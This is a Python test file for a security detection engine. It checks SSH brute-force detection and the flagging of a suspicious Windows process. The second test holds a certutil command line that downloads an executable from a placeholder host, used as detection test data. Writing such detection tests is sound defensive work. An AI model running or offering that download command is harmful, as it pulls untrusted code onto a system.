from datetime import UTC, datetime, timedelta

from app.config import Settings
from app.detection.engine import DetectionEngine
from app.schemas import NormalizedEvent


def test_detects_ssh_brute_force_inside_time_window():
    start = datetime(2026, 7, 11, 10, 0, tzinfo=UTC)
    events = [
        NormalizedEvent(
            timestamp=start + timedelta(seconds=index * 30),
            source="linux_auth",
            event_type="auth_failure",
            username="admin",
            src_ip="203.0.113.10",
            raw="failed",
            details={"protocol": "ssh"},
        )
        for index in range(5)
    ]
    engine = DetectionEngine(Settings(failed_login_threshold=5, failed_login_window_minutes=5))

    findings = engine.analyze(events)

    assert findings[0].rule_id == "SOC-AUTH-001"
    assert findings[0].event_count == 5
    assert "T1110" in findings[0].mitre_attack[0]


def test_detects_suspicious_windows_process():
    event = NormalizedEvent(
        timestamp=datetime.now(UTC),
        source="windows_event_log",
        event_type="process_started",
        process=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -split -f https://example.invalid/a.exe",
        raw={},
    )

    findings = DetectionEngine().analyze([event])

    assert findings[0].rule_id == "SOC-PROC-001"
    assert findings[0].severity == "high"
